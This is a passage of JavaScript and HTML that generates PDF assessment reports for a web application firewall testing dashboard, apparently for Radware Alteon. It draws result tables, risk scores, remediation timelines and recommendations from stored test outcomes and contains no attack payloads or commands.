    const complianceText = data.analytics.complianceScore >= 80 ? 
        'Strong compliance posture with minor gaps' :
        data.analytics.complianceScore >= 60 ?
        'Moderate compliance requiring targeted improvements' :
        'Significant compliance gaps requiring immediate attention';
    
    doc.text(complianceText, 25, summaryY + 20);
}

async function addRemediationRoadmap(doc, data) {
    addSectionHeader(doc, 'Remediation Roadmap', 'Prioritized Action Plan');
    
    // Timeline visualization
    const phases = [
        {
            name: 'Immediate (0-7 days)',
            color: [239, 68, 68],
            items: [
                'Fix all critical severity vulnerabilities',
                'Implement emergency WAF rules for critical gaps',
                'Enable comprehensive logging and monitoring'
            ],
            count: data.statistics.critical.failed
        },
        {
            name: 'Short-term (1-4 weeks)',
            color: [251, 146, 60],
            items: [
                'Address high severity findings',
                'Strengthen input validation rules',
                'Implement positive security model'
            ],
            count: data.statistics.high.failed
        },
        {
            name: 'Medium-term (1-3 months)',
            color: [245, 158, 11],
            items: [
                'Complete medium severity remediations',
                'Enhance security testing procedures',
                'Implement automated security scanning'
            ],
            count: data.statistics.medium.failed
        },
        {
            name: 'Long-term (3-6 months)',
            color: [99, 102, 241],
            items: [
                'Address remaining low severity issues',
                'Implement comprehensive security program',
                'Achieve target compliance certifications'
            ],
            count: data.statistics.low.failed + data.statistics.pending
        }
    ];
    
    let y = 60;
    
    // Timeline visual
    doc.setDrawColor(226, 232, 240);
    doc.setLineWidth(3);
    doc.line(30, y, 30, y + 120);
    
    phases.forEach((phase, index) => {
        // Phase marker
        doc.setFillColor(...phase.color);
        doc.circle(30, y + (index * 30), 5, 'F');
        
        // Phase details
        doc.setFontSize(11);
        doc.setFont(undefined, 'bold');
        doc.setTextColor(...phase.color);
        doc.text(phase.name, 40, y + (index * 30) - 2);
        
        doc.setFontSize(9);
        doc.setFont(undefined, 'normal');
        doc.setTextColor(71, 85, 105);
        doc.text(`${phase.count} issues to address`, 40, y + (index * 30) + 5);
        
        // Action items
        phase.items.forEach((item, itemIndex) => {
            doc.setFontSize(8);
            doc.text(`• ${item}`, 45, y + (index * 30) + 12 + (itemIndex * 5));
        });
    });
    
    // Cost-benefit analysis
    y = 200;
    doc.setFontSize(12);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(31, 41, 55);
    doc.text('Implementation Priorities', 20, y);
    
    const priorities = [
        {
            priority: 'P1',
            description: 'Critical vulnerabilities with immediate exploit potential',
            effort: 'Low',
            impact: 'Very High',
            color: [239, 68, 68]
        },
        {
            priority: 'P2',
            description: 'High-risk configuration gaps',
            effort: 'Medium',
            impact: 'High',
            color: [251, 146, 60]
        },
        {
            priority: 'P3',
            description: 'Input validation enhancements',
            effort: 'Medium',
            impact: 'Medium',
            color: [245, 158, 11]
        },
        {
            priority: 'P4',
            description: 'Long-term security improvements',
            effort: 'High',
            impact: 'Medium',
            color: [99, 102, 241]
        }
    ];
    
    // Priority matrix
    const matrixData = [
        ['Priority', 'Description', 'Effort', 'Impact']
    ];
    
    priorities.forEach(p => {
        matrixData.push([p.priority, p.description, p.effort, p.impact]);
    });
    
    doc.autoTable({
        startY: y + 10,
        head: [matrixData[0]],
        body: matrixData.slice(1),
        theme: 'grid',
        headStyles: {
            fillColor: [31, 41, 55],
            textColor: 255,
            fontSize: 9
        },
        bodyStyles: {
            fontSize: 8
        },
        columnStyles: {
            0: { cellWidth: 20, halign: 'center', fontStyle: 'bold' },
            1: { cellWidth: 90 },
            2: { cellWidth: 25, halign: 'center' },
            3: { cellWidth: 25, halign: 'center' }
        },
        didDrawCell: function(data) {
            if (data.column.index === 0 && data.row.index >= 0) {
                const priority = priorities[data.row.index];
                doc.setFillColor(...priority.color);
                doc.circle(data.cell.x + 10, data.cell.y + data.cell.height / 2, 3, 'F');
            }
        }
    });
}

async function addTechnicalAppendix(doc, data) {
    doc.addPage();
    addSectionHeader(doc, 'Technical Appendix', 'Detailed Test Information');
    
    let y = 60;
    
    // Test methodology
    doc.setFontSize(12);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(31, 41, 55);
    doc.text('Testing Methodology', 20, y);
    
    y += 10;
    doc.setFontSize(9);
    doc.setFont(undefined, 'normal');
    doc.setTextColor(71, 85, 105);
    
    const methodology = [
        'Comprehensive WAF bypass testing using OWASP methodologies',
        'Automated and manual testing combination',
        'Real-world attack simulation scenarios',
        'Zero-knowledge and authenticated testing approaches'
    ];
    
    methodology.forEach(method => {
        doc.text(`• ${method}`, 25, y);
        y += 6;
    });
    
    // Tools and techniques
    y += 10;
    doc.setFontSize(12);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(31, 41, 55);
    doc.text('Tools and Techniques', 20, y);
    
    y += 10;
    doc.setFontSize(9);
    doc.setFont(undefined, 'normal');
    doc.setTextColor(71, 85, 105);
    
    const tools = [
        'Custom WAF testing suite',
        'cURL for precise HTTP manipulation',
        'Encoding and obfuscation techniques',
        'Protocol-level testing capabilities'
    ];
    
    tools.forEach(tool => {
        doc.text(`• ${tool}`, 25, y);
        y += 6;
    });
    
    // Glossary
    y += 10;
    doc.setFontSize(12);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(31, 41, 55);
    doc.text('Glossary', 20, y);
    
    y += 10;
    const glossaryTerms = [
        { term: 'WAF', definition: 'Web Application Firewall' },
        { term: 'XSS', definition: 'Cross-Site Scripting' },
        { term: 'SQLi', definition: 'SQL Injection' },
        { term: 'OWASP', definition: 'Open Web Application Security Project' }
    ];
    
    glossaryTerms.forEach(item => {
        doc.setFontSize(9);
        doc.setFont(undefined, 'bold');
        doc.text(`${item.term}:`, 25, y);
        doc.setFont(undefined, 'normal');
        doc.text(item.definition, 45, y);
        y += 6;
    });
    
    // Disclaimer
    y = 250;
    doc.setFillColor(255, 243, 224);
    doc.roundedRect(20, y, 170, 25, 3, 3, 'F');
    
    doc.setFontSize(8);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(133, 77, 14);
    doc.text('DISCLAIMER', 25, y + 8);
    
    doc.setFont(undefined, 'normal');
    const disclaimer = 'This report is confidential and intended solely for security assessment purposes. Unauthorized distribution is prohibited.';
    const disclaimerLines = doc.splitTextToSize(disclaimer, 160);
    doc.text(disclaimerLines, 25, y + 15);
}

// Chart rendering helper
async function addRiskDistributionChart(doc, data, x, y) {
    const canvas = document.getElementById('tempChart');
    const ctx = canvas.getContext('2d');
    
    canvas.width = 300;
    canvas.height = 200;
    
    const chartData = {
        labels: ['Critical', 'High', 'Medium', 'Low'],
        datasets: [{
            label: 'Failed Tests',
            data: [
                data.statistics.critical.failed,
                data.statistics.high.failed,
                data.statistics.medium.failed,
                data.statistics.low.failed
            ],
            backgroundColor: [
                'rgba(239, 68, 68, 0.8)',
                'rgba(251, 146, 60, 0.8)',
                'rgba(245, 158, 11, 0.8)',
                'rgba(156, 163, 175, 0.8)'
            ],
            borderColor: [
                'rgb(239, 68, 68)',
                'rgb(251, 146, 60)',
                'rgb(245, 158, 11)',
                'rgb(156, 163, 175)'
            ],
            borderWidth: 1
        }]
    };
    
    const chart = new Chart(ctx, {
        type: 'bar',
        data: chartData,
        options: {
            responsive: false,
            plugins: {
                legend: {
                    display: false
                }
            },
            scales: {
                y: {
                    beginAtZero: true,
                    title: {
                        display: true,
                        text: 'Number of Failed Tests'
                    }
                }
            }
        }
    });
    
    await new Promise(resolve => setTimeout(resolve, 100));
    
    const chartImage = canvas.toDataURL('image/png');
    doc.addImage(chartImage, 'PNG', x, y, 100, 60);
    
    chart.destroy();
}
</script>
















































<!-- Add these CDN links in the <head> section after the existing scripts -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.31/jspdf.plugin.autotable.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

<!-- Add this CSS for the floating button in the <style> section -->
<style>
    /* Floating PDF Button */
    .floating-pdf-btn {
        position: fixed;
        bottom: 2rem;
        right: 2rem;
        width: 60px;
        height: 60px;
        background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        box-shadow: 0 4px 20px rgba(239, 68, 68, 0.3);
        transition: all 0.3s ease;
        z-index: 1000;
    }

    .floating-pdf-btn:hover {
        transform: translateY(-5px);
        box-shadow: 0 8px 30px rgba(239, 68, 68, 0.4);
    }

    .floating-pdf-btn i {
        color: white;
        font-size: 1.5rem;
    }

    .pdf-generating {
        animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
        0% { transform: scale(1); }
        50% { transform: scale(1.1); }
        100% { transform: scale(1); }
    }
</style>

<!-- Add this floating button before closing </body> tag -->
<button class="floating-pdf-btn" onclick="generatePDFReport()" title="Generate PDF Report">
    <i class="fas fa-file-pdf"></i>
</button>

<!-- Add this new script tag for the PDF generator -->
<script>
// PDF Report Generator
async function generatePDFReport() {
    const { jsPDF } = window.jspdf;
    const doc = new jsPDF({
        orientation: 'portrait',
        unit: 'mm',
        format: 'a4'
    });
    
    // Show generating indicator
    const pdfBtn = document.querySelector('.floating-pdf-btn');
    pdfBtn.classList.add('pdf-generating');
    showToast('Generating PDF report...');
    
    try {
        // Report data preparation
        const reportData = prepareReportData();
        
        // Cover Page
        addCoverPage(doc, reportData);
        
        // Executive Summary
        doc.addPage();
        addExecutiveSummary(doc, reportData);
        
        // Test Results Matrix
        doc.addPage();
        addTestResultsMatrix(doc, reportData);
        
        // Severity Analysis
        doc.addPage();
        addSeverityAnalysis(doc, reportData);
        
        // Category Breakdown
        doc.addPage();
        addCategoryBreakdown(doc, reportData);
        
        // Detailed Test Results
        addDetailedResults(doc, reportData);
        
        // Risk Assessment
        doc.addPage();
        addRiskAssessment(doc, reportData);
        
        // Recommendations
        doc.addPage();
        addRecommendations(doc, reportData);
        
        // Save the PDF
        const filename = `WAF_Security_Report_${new Date().toISOString().split('T')[0]}.pdf`;
        doc.save(filename);
        
        showToast('PDF report generated successfully!');
    } catch (error) {
        console.error('PDF generation error:', error);
        showToast('Error generating PDF report!');
    } finally {
        pdfBtn.classList.remove('pdf-generating');
    }
}

// Prepare report data
function prepareReportData() {
    const allTests = Object.values(tests).flat();
    const data = {
        metadata: {
            generatedDate: new Date().toLocaleString(),
            targetHost: settings.targetHost,
            reportVersion: '1.0',
            totalCategories: Object.keys(tests).length,
            totalTests: allTests.length,
            totalScenarios: allTests.reduce((acc, test) => acc + test.scenarios.length, 0)
        },
        statistics: {
            passed: 0,
            failed: 0,
            skipped: 0,
            pending: 0,
            critical: { total: 0, passed: 0, failed: 0, skipped: 0, pending: 0 },
            high: { total: 0, passed: 0, failed: 0, skipped: 0, pending: 0 },
            medium: { total: 0, passed: 0, failed: 0, skipped: 0, pending: 0 },
            low: { total: 0, passed: 0, failed: 0, skipped: 0, pending: 0 }
        },
        categoryStats: {},
        testDetails: [],
        failedTests: [],
        passedTests: []
    };
    
    // Calculate statistics
    Object.entries(tests).forEach(([category, categoryTests]) => {
        data.categoryStats[category] = {
            total: 0,
            passed: 0,
            failed: 0,
            skipped: 0,
            pending: 0
        };
        
        categoryTests.forEach(test => {
            const result = testResults[test.id] || {};
            const severity = test.severity;
            
            test.scenarios.forEach(scenario => {
                data.statistics[severity].total++;
                data.categoryStats[category].total++;
                
                const status = result.scenarios ? result.scenarios[scenario.id] : 'pending';
                
                if (status === 'passed') {
                    data.statistics.passed++;
                    data.statistics[severity].passed++;
                    data.categoryStats[category].passed++;
                } else if (status === 'failed') {
                    data.statistics.failed++;
                    data.statistics[severity].failed++;
                    data.categoryStats[category].failed++;
                } else if (status === 'skipped') {
                    data.statistics.skipped++;
                    data.statistics[severity].skipped++;
                    data.categoryStats[category].skipped++;
                } else {
                    data.statistics.pending++;
                    data.statistics[severity].pending++;
                    data.categoryStats[category].pending++;
                }
            });
            
            // Store test details
            data.testDetails.push({
                category,
                test,
                result: result,
                overallStatus: getTestOverallStatus(test, result)
            });
            
            // Categorize tests
            const overallStatus = getTestOverallStatus(test, result);
            if (overallStatus === 'failed') {
                data.failedTests.push({ category, test, result });
            } else if (overallStatus === 'passed') {
                data.passedTests.push({ category, test, result });
            }
        });
    });
    
    return data;
}

// Add Cover Page
function addCoverPage(doc, data) {
    // Background gradient effect
    doc.setFillColor(31, 41, 55);
    doc.rect(0, 0, 210, 297, 'F');
    
    // Title
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(36);
    doc.setFont(undefined, 'bold');
    doc.text('WAF Security', 105, 80, { align: 'center' });
    doc.text('Assessment Report', 105, 95, { align: 'center' });
    
    // Logo/Icon area
    doc.setFillColor(99, 102, 241);
    doc.circle(105, 130, 20, 'F');
    doc.setFontSize(24);
    doc.text('🛡️', 105, 137, { align: 'center' });
    
    // Subtitle
    doc.setFontSize(16);
    doc.setFont(undefined, 'normal');
    doc.text('Radware Alteon WAF Testing Suite', 105, 170, { align: 'center' });
    
    // Metadata box
    doc.setFillColor(255, 255, 255, 10);
    doc.roundedRect(30, 190, 150, 60, 5, 5, 'F');
    
    doc.setFontSize(12);
    doc.text(`Target Host: ${data.metadata.targetHost}`, 105, 205, { align: 'center' });
    doc.text(`Generated: ${data.metadata.generatedDate}`, 105, 215, { align: 'center' });
    doc.text(`Total Tests: ${data.metadata.totalTests}`, 105, 225, { align: 'center' });
    doc.text(`Total Scenarios: ${data.metadata.totalScenarios}`, 105, 235, { align: 'center' });
    
    // Footer
    doc.setFontSize(10);
    doc.setTextColor(150, 150, 150);
    doc.text('Confidential Security Report', 105, 280, { align: 'center' });
}

// Add Executive Summary
function addExecutiveSummary(doc, data) {
    doc.setTextColor(0, 0, 0);
    doc.setFontSize(20);
    doc.setFont(undefined, 'bold');
    doc.text('Executive Summary', 20, 30);
    
    // Summary stats
    const totalScenarios = data.metadata.totalScenarios;
    const completedScenarios = data.statistics.passed + data.statistics.failed + data.statistics.skipped;
    const completionRate = Math.round((completedScenarios / totalScenarios) * 100);
    const passRate = completedScenarios > 0 ? Math.round((data.statistics.passed / completedScenarios) * 100) : 0;
    const failRate = completedScenarios > 0 ? Math.round((data.statistics.failed / completedScenarios) * 100) : 0;
    
    doc.setFontSize(12);
    doc.setFont(undefined, 'normal');
    
    // Key Metrics Box
    doc.setFillColor(248, 250, 252);
    doc.roundedRect(20, 40, 170, 50, 3, 3, 'F');
    
    doc.setFont(undefined, 'bold');
    doc.text('Key Metrics', 25, 50);
    doc.setFont(undefined, 'normal');
    doc.setFontSize(10);
    
    const metrics = [
        [`Completion Rate: ${completionRate}%`, `Pass Rate: ${passRate}%`, `Fail Rate: ${failRate}%`],
        [`Total Scenarios: ${totalScenarios}`, `Completed: ${completedScenarios}`, `Pending: ${data.statistics.pending}`]
    ];
    
    let y = 60;
    metrics.forEach(row => {
        let x = 25;
        row.forEach(metric => {
            doc.text(metric, x, y);
            x += 60;
        });
        y += 10;
    });
    
    // Risk Summary
    y = 100;
    doc.setFontSize(14);
    doc.setFont(undefined, 'bold');
    doc.text('Risk Summary', 20, y);
    
    y += 10;
    doc.setFontSize(11);
    doc.setFont(undefined, 'normal');
    
    // Critical findings
    const criticalFailed = data.statistics.critical.failed;
    const highFailed = data.statistics.high.failed;
    
    if (criticalFailed > 0) {
        doc.setTextColor(239, 68, 68);
        doc.text(`⚠️ ${criticalFailed} Critical severity scenarios failed`, 25, y);
        y += 8;
    }
    
    if (highFailed > 0) {
        doc.setTextColor(251, 146, 60);
        doc.text(`⚠️ ${highFailed} High severity scenarios failed`, 25, y);
        y += 8;
    }
    
    doc.setTextColor(0, 0, 0);
    
    // Overall Assessment
    y += 10;
    doc.setFontSize(14);
    doc.setFont(undefined, 'bold');
    doc.text('Overall Assessment', 20, y);
    
    y += 10;
    doc.setFontSize(11);
    doc.setFont(undefined, 'normal');
    
    let assessment = '';
    let assessmentColor = [0, 0, 0];
    
    if (criticalFailed > 0) {
        assessment = 'CRITICAL: Immediate action required. Critical vulnerabilities detected.';
        assessmentColor = [239, 68, 68];
    } else if (highFailed > 0) {
        assessment = 'HIGH RISK: Significant vulnerabilities require prompt attention.';
        assessmentColor = [251, 146, 60];
    } else if (data.statistics.failed > 0) {
        assessment = 'MODERATE RISK: Some vulnerabilities detected. Review and remediate.';
        assessmentColor = [245, 158, 11];
    } else if (completionRate === 100 && data.statistics.passed === totalScenarios) {
        assessment = 'SECURE: All tests passed. WAF configuration appears robust.';
        assessmentColor = [16, 185, 129];
    } else {
        assessment = 'INCOMPLETE: Testing in progress. Complete all tests for full assessment.';
        assessmentColor = [100, 116, 139];
    }
    
    doc.setTextColor(...assessmentColor);
    const assessmentLines = doc.splitTextToSize(assessment, 160);
    doc.text(assessmentLines, 25, y);
}

// Add Test Results Matrix
function addTestResultsMatrix(doc, data) {
    doc.setTextColor(0, 0, 0);
    doc.setFontSize(20);
    doc.setFont(undefined, 'bold');
    doc.text('Test Results Matrix', 20, 30);
    
    // Severity Matrix
    const matrixData = [
        ['Severity', 'Total', 'Passed', 'Failed', 'Skipped', 'Pending', 'Pass Rate'],
        [
            'CRITICAL',
            data.statistics.critical.total,
            data.statistics.critical.passed,
            data.statistics.critical.failed,
            data.statistics.critical.skipped,
            data.statistics.critical.pending,
            data.statistics.critical.total > 0 ? 
                `${Math.round((data.statistics.critical.passed / data.statistics.critical.total) * 100)}%` : 'N/A'
        ],
        [
            'HIGH',
            data.statistics.high.total,
            data.statistics.high.passed,
            data.statistics.high.failed,
            data.statistics.high.skipped,
            data.statistics.high.pending,
            data.statistics.high.total > 0 ? 
                `${Math.round((data.statistics.high.passed / data.statistics.high.total) * 100)}%` : 'N/A'
        ],
        [
            'MEDIUM',
            data.statistics.medium.total,
            data.statistics.medium.passed,
            data.statistics.medium.failed,
            data.statistics.medium.skipped,
            data.statistics.medium.pending,
            data.statistics.medium.total > 0 ? 
                `${Math.round((data.statistics.medium.passed / data.statistics.medium.total) * 100)}%` : 'N/A'
        ],
        [
            'LOW',
            data.statistics.low.total,
            data.statistics.low.passed,
            data.statistics.low.failed,
            data.statistics.low.skipped,
            data.statistics.low.pending,
            data.statistics.low.total > 0 ? 
                `${Math.round((data.statistics.low.passed / data.statistics.low.total) * 100)}%` : 'N/A'
        ]
    ];
    
    doc.autoTable({
        startY: 40,
        head: [matrixData[0]],
        body: matrixData.slice(1),
        theme: 'grid',
        headStyles: {
            fillColor: [31, 41, 55],
            textColor: 255,
            fontSize: 10,
            fontStyle: 'bold'
        },
        bodyStyles: {
            fontSize: 9
        },
        columnStyles: {
            0: { cellWidth: 30, fontStyle: 'bold' },
            1: { cellWidth: 20, halign: 'center' },
            2: { cellWidth: 20, halign: 'center', textColor: [16, 185, 129] },
            3: { cellWidth: 20, halign: 'center', textColor: [239, 68, 68] },
            4: { cellWidth: 20, halign: 'center', textColor: [245, 158, 11] },
            5: { cellWidth: 20, halign: 'center', textColor: [100, 116, 139] },
            6: { cellWidth: 25, halign: 'center', fontStyle: 'bold' }
        }
    });
    
    // Visual Progress Chart
    const chartY = doc.lastAutoTable.finalY + 20;
    doc.setFontSize(14);
    doc.setFont(undefined, 'bold');
    doc.text('Test Progress Visualization', 20, chartY);
    
    // Draw progress bars for each severity
    let barY = chartY + 10;
    const barHeight = 15;
    const barWidth = 150;
    const severities = ['critical', 'high', 'medium', 'low'];
    const colors = {
        critical: [239, 68, 68],
        high: [251, 146, 60],
        medium: [245, 158, 11],
        low: [16, 185, 129]
    };
    
    severities.forEach(severity => {
        const stats = data.statistics[severity];
        const total = stats.total;
        if (total === 0) return;
        
        // Background
        doc.setFillColor(240, 240, 240);
        doc.roundedRect(30, barY, barWidth, barHeight, 2, 2, 'F');
        
        // Progress segments
        let currentX = 30;
        
        // Passed
        if (stats.passed > 0) {
            const passedWidth = (stats.passed / total) * barWidth;
            doc.setFillColor(16, 185, 129);
            doc.rect(currentX, barY, passedWidth, barHeight, 'F');
            currentX += passedWidth;
        }
        
        // Failed
        if (stats.failed > 0) {
            const failedWidth = (stats.failed / total) * barWidth;
            doc.setFillColor(239, 68, 68);
            doc.rect(currentX, barY, failedWidth, barHeight, 'F');
            currentX += failedWidth;
        }
        
        // Skipped
        if (stats.skipped > 0) {
            const skippedWidth = (stats.skipped / total) * barWidth;
            doc.setFillColor(245, 158, 11);
            doc.rect(currentX, barY, skippedWidth, barHeight, 'F');
        }
        
        // Label
        doc.setFontSize(10);
        doc.setTextColor(0, 0, 0);
        doc.text(severity.toUpperCase(), 20, barY + 10);
        
        barY += 20;
    });
}

// Add Severity Analysis
function addSeverityAnalysis(doc, data) {
    doc.setTextColor(0, 0, 0);
    doc.setFontSize(20);
    doc.setFont(undefined, 'bold');
    doc.text('Severity Analysis', 20, 30);
    
    // Failed Tests by Severity
    let y = 45;
    const severities = ['critical', 'high', 'medium', 'low'];
    
    severities.forEach(severity => {
        const failedTests = data.testDetails.filter(td => 
            td.test.severity === severity && 
            td.overallStatus === 'failed'
        );
        
        if (failedTests.length === 0) return;
        
        doc.setFontSize(14);
        doc.setFont(undefined, 'bold');
        doc.setTextColor(severity === 'critical' ? 239 : severity === 'high' ? 251 : severity === 'medium' ? 245 : 100,
                        severity === 'critical' ? 68 : severity === 'high' ? 146 : severity === 'medium' ? 158 : 116,
                        severity === 'critical' ? 68 : severity === 'high' ? 60 : severity === 'medium' ? 11 : 139);
        doc.text(`${severity.toUpperCase()} Severity Failures`, 20, y);
        
        y += 8;
        doc.setFontSize(10);
        doc.setFont(undefined, 'normal');
        doc.setTextColor(0, 0, 0);
        
        failedTests.forEach(ft => {
            if (y > 250) {
                doc.addPage();
                y = 30;
            }
            
            const lines = doc.splitTextToSize(`• ${ft.test.name} (${ft.test.id}) - ${ft.category}`, 160);
            doc.text(lines, 25, y);
            y += lines.length * 5 + 3;
        });
        
        y += 10;
    });
}

// Add Category Breakdown
function addCategoryBreakdown(doc, data) {
    doc.setTextColor(0, 0, 0);
    doc.setFontSize(20);
    doc.setFont(undefined, 'bold');
    doc.text('Category Breakdown', 20, 30);
    
    const categoryData = [['Category', 'Total', 'Passed', 'Failed', 'Skipped', 'Pending', 'Completion']];
    
    Object.entries(data.categoryStats).forEach(([category, stats]) => {
        const completion = stats.total > 0 ? 
            Math.round(((stats.passed + stats.failed + stats.skipped) / stats.total) * 100) : 0;
        
        categoryData.push([
            category,
            stats.total,
            stats.passed,
            stats.failed,
            stats.skipped,
            stats.pending,
            `${completion}%`
        ]);
    });
    
    doc.autoTable({
        startY: 40,
        head: [categoryData[0]],
        body: categoryData.slice(1),
        theme: 'striped',
        headStyles: {
            fillColor: [31, 41, 55],
            textColor: 255,
            fontSize: 10,
            fontStyle: 'bold'
        },
        bodyStyles: {
            fontSize: 9
        },
        columnStyles: {
            0: { cellWidth: 50 },
            1: { cellWidth: 20, halign: 'center' },
            2: { cellWidth: 20, halign: 'center', textColor: [16, 185, 129] },
            3: { cellWidth: 20, halign: 'center', textColor: [239, 68, 68] },
            4: { cellWidth: 20, halign: 'center', textColor: [245, 158, 11] },
            5: { cellWidth: 20, halign: 'center' },
            6: { cellWidth: 25, halign: 'center', fontStyle: 'bold' }
        }
    });
}

// Add Detailed Results
function addDetailedResults(doc, data) {
    doc.addPage();
    doc.setTextColor(0, 0, 0);
    doc.setFontSize(20);
    doc.setFont(undefined, 'bold');
    doc.text('Detailed Test Results', 20, 30);
    
    let y = 45;
    
    // Group by category
    Object.entries(tests).forEach(([category, categoryTests]) => {
        if (y > 250) {
            doc.addPage();
            y = 30;
        }
        
        doc.setFontSize(14);
        doc.setFont(undefined, 'bold');
        doc.setTextColor(31, 41, 55);
        doc.text(category, 20, y);
        y += 10;
        
        categoryTests.forEach(test => {
            if (y > 240) {
                doc.addPage();
                y = 30;
            }
            
            const result = testResults[test.id] || {};
            const overallStatus = getTestOverallStatus(test, result);
            
            // Test header
            doc.setFontSize(11);
            doc.setFont(undefined, 'bold');
            doc.setTextColor(0, 0, 0);
            doc.text(`${test.name} (${test.id})`, 25, y);
            
            // Status indicator
            const statusColors = {
                passed: [16, 185, 129],
                failed: [239, 68, 68],
                skipped: [245, 158, 11],
                partial: [59, 130, 246],
                pending: [100, 116, 139]
            };
            
            doc.setFillColor(...statusColors[overallStatus]);
            doc.circle(185, y - 2, 3, 'F');
            
            y += 6;
            doc.setFontSize(9);
            doc.setFont(undefined, 'normal');
            doc.setTextColor(100, 100, 100);
            
            const descLines = doc.splitTextToSize(test.description, 150);
            doc.text(descLines, 25, y);
            y += descLines.length * 4;
            
            // Scenario results summary
            const scenarioResults = test.scenarios.map(s => {
                const status = result.scenarios ? result.scenarios[s.id] : 'pending';
                return status;
            });
            
            const counts = {
                passed: scenarioResults.filter(s => s === 'passed').length,
                failed: scenarioResults.filter(s => s === 'failed').length,
                skipped: scenarioResults.filter(s => s === 'skipped').length,
                pending: scenarioResults.filter(s => s === 'pending').length
            };
            
            doc.setFontSize(8);
            doc.text(`Scenarios: ${test.scenarios.length} total | ${counts.passed} passed | ${counts.failed} failed | ${counts.skipped} skipped | ${counts.pending} pending`, 25, y);
            
            // Notes if any
            if (result.notes) {
                y += 5;
                doc.setTextColor(50, 50, 50);
                const noteLines = doc.splitTextToSize(`Notes: ${result.notes}`, 150);
                doc.text(noteLines, 25, y);
                y += noteLines.length * 4;
            }
            
            y += 8;
        });
        
        y += 5;
    });
}

// Add Risk Assessment
function addRiskAssessment(doc, data) {
    doc.setTextColor(0, 0, 0);
    doc.setFontSize(20);
    doc.setFont(undefined, 'bold');
    doc.text('Risk Assessment', 20, 30);
    
    const riskMatrix = [
        {
            level: 'CRITICAL',
            color: [239, 68, 68],
            impact: 'Severe',
            likelihood: 'High',
            failed: data.statistics.critical.failed,
            total: data.statistics.critical.total,
            description: 'Immediate exploitation possible. System compromise likely.'
        },
        {
            level: 'HIGH',
            color: [251, 146, 60],
            impact: 'Major',
            likelihood: 'Medium-High',
            failed: data.statistics.high.failed,
            total: data.statistics.high.total,
            description: 'Significant security gaps. Exploitation feasible with moderate effort.'
        },
        {
            level: 'MEDIUM',
            color: [245, 158, 11],
            impact: 'Moderate',
            likelihood: 'Medium',
            failed: data.statistics.medium.failed,
            total: data.statistics.medium.total,
            description: 'Notable weaknesses. Could be exploited under specific conditions.'
        },
        {
            level: 'LOW',
            color: [100, 116, 139],
            impact: 'Minor',
            likelihood: 'Low',
            failed: data.statistics.low.failed,
            total: data.statistics.low.total,
            description: 'Minor issues. Unlikely to result in significant compromise.'
        }
    ];
    
    let y = 45;
    
    riskMatrix.forEach(risk => {
        if (risk.failed > 0) {
            // Risk level header
            doc.setFillColor(...risk.color);
            doc.roundedRect(20, y - 5, 170, 30, 3, 3, 'F');
            
            doc.setTextColor(255, 255, 255);
            doc.setFontSize(12);
            doc.setFont(undefined, 'bold');
            doc.text(`${risk.level} RISK`, 25, y + 3);
            
            doc.setFontSize(10);
            doc.setFont(undefined, 'normal');
            doc.text(`${risk.failed} of ${risk.total} scenarios failed`, 25, y + 10);
            doc.text(`Impact: ${risk.impact} | Likelihood: ${risk.likelihood}`, 25, y + 17);
            
            y += 35;
            
            // Description
            doc.setTextColor(0, 0, 0);
            doc.setFontSize(9);
            const descLines = doc.splitTextToSize(risk.description, 160);
            doc.text(descLines, 25, y);
            
            y += descLines.length * 5 + 10;
        }
    });
    
    // Risk Score Calculation
    y += 10;
    doc.setFontSize(14);
    doc.setFont(undefined, 'bold');
    doc.text('Overall Risk Score', 20, y);
    
    y += 10;
    const riskScore = calculateRiskScore(data);
    const riskLevel = getRiskLevel(riskScore);
    
    // Risk meter
    doc.setFillColor(240, 240, 240);
    doc.roundedRect(30, y, 140, 20, 10, 10, 'F');
    
    // Risk level fill
    const riskColors = {
        'LOW': [16, 185, 129],
        'MEDIUM': [245, 158, 11],
        'HIGH': [251, 146, 60],
        'CRITICAL': [239, 68, 68]
    };
    
    doc.setFillColor(...riskColors[riskLevel]);
    doc.roundedRect(30, y, (riskScore / 100) * 140, 20, 10, 10, 'F');
    
    // Score text
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(12);
    doc.setFont(undefined, 'bold');
    doc.text(`${riskScore}/100`, 100, y + 13, { align: 'center' });
    
    y += 30;
    doc.setTextColor(0, 0, 0);
    doc.setFontSize(11);
    doc.text(`Risk Level: ${riskLevel}`, 30, y);
}

// Add Recommendations
function addRecommendations(doc, data) {
    doc.setTextColor(0, 0, 0);
    doc.setFontSize(20);
    doc.setFont(undefined, 'bold');
    doc.text('Recommendations', 20, 30);
    
    let y = 45;
    
    const recommendations = generateRecommendations(data);
    
    recommendations.forEach((rec, index) => {
        if (y > 240) {
            doc.addPage();
            y = 30;
        }
        
        // Priority indicator
        const priorityColors = {
            'IMMEDIATE': [239, 68, 68],
            'HIGH': [251, 146, 60],
            'MEDIUM': [245, 158, 11],
            'LOW': [100, 116, 139]
        };
        
        doc.setFillColor(...priorityColors[rec.priority]);
        doc.circle(25, y - 2, 3, 'F');
        
        // Recommendation
        doc.setFontSize(11);
        doc.setFont(undefined, 'bold');
        doc.setTextColor(0, 0, 0);
        doc.text(`${index + 1}. ${rec.title}`, 32, y);
        
        y += 7;
        doc.setFontSize(9);
        doc.setFont(undefined, 'normal');
        doc.setTextColor(60, 60, 60);
        
        const descLines = doc.splitTextToSize(rec.description, 150);
        doc.text(descLines, 32, y);
        y += descLines.length * 4;
        
        // Action items
        if (rec.actions && rec.actions.length > 0) {
            y += 3;
            doc.setFontSize(8);
            doc.setTextColor(80, 80, 80);
            rec.actions.forEach(action => {
                const actionLines = doc.splitTextToSize(`• ${action}`, 145);
                doc.text(actionLines, 35, y);
                y += actionLines.length * 4;
            });
        }
        
        y += 10;
    });
    
    // Footer
    const pageCount = doc.internal.getNumberOfPages();
    for (let i = 1; i <= pageCount; i++) {
